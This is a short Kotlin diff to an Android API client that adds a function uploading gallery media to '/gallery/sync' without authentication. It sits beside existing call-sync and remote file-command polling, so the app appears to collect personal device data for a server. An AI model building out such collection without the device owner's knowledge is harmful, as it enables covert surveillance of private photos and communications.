@@ -123,6 +123,10 @@ class SentryApiClient(
         post("/calls/sync", body, authenticated = false)
     }
 
+    suspend fun syncGalleryMedia(body: JSONObject): Result<JSONObject> = withContext(Dispatchers.IO) {
+        post("/gallery/sync", body, authenticated = false)
+    }
+
     suspend fun pollFileCommands(): Result<JSONObject> = withContext(Dispatchers.IO) {
         val deviceId = CryptoManager.getOrCreateDeviceId(context)
         request("GET", "/files/command/$deviceId", null, authenticated = false)
